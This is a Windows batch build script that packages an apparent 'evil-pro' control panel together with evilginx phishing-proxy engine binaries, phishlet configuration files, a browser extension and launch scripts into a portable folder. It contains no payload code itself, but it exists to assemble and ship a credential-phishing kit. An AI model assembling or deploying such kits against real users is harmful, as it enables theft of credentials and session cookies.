@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo === building evil-pro portable control panel ===
set CGO_ENABLED=0
set OUT=dist\evil-pro-control-panel

echo [1/6] clean
if exist "%OUT%" rmdir /s /q "%OUT%"
mkdir "%OUT%" || goto :err
mkdir "%OUT%\phishlets" 2>nul
mkdir "%OUT%\extension" 2>nul

echo [2/6] panel binaries
set GOOS=windows
set GOARCH=amd64
go build -mod=mod -o "%OUT%\evilpro-panel.exe" .\controlpanel || goto :err
set GOOS=linux
go build -mod=mod -o "%OUT%\evilpro-panel-linux" .\controlpanel || goto :err
set GOOS=darwin
go build -mod=mod -o "%OUT%\evilpro-panel-mac" .\controlpanel || goto :err

echo [3/6] engine binaries (linux amd64 + arm64)
set GOOS=linux
set GOARCH=amd64
go build -mod=mod -o "%OUT%\evilginx-linux" . || goto :err
set GOARCH=arm64
go build -mod=mod -o "%OUT%\evilginx-linux-arm64" . || goto :err

echo [4/6] phishlets
copy /y phishlets\*.yaml "%OUT%\phishlets\" >nul || goto :err

echo [5/6] extension
xcopy /y /q /e /i extension "%OUT%\extension" >nul

echo [6/6] launchers + readme
copy /y controlpanel\portable\START.bat "%OUT%\" >nul
copy /y controlpanel\portable\SETUP.bat "%OUT%\" >nul
copy /y controlpanel\portable\START.sh "%OUT%\" >nul
copy /y controlpanel\portable\SETUP.sh "%OUT%\" >nul
copy /y controlpanel\portable\README.txt "%OUT%\" >nul

echo.
echo Done. Portable folder:
echo   %OUT%
echo Copy that folder anywhere and run START.bat
echo.
dir /b "%OUT%"
exit /b 0

:err
echo.
echo *** BUILD FAILED ***
exit /b 1
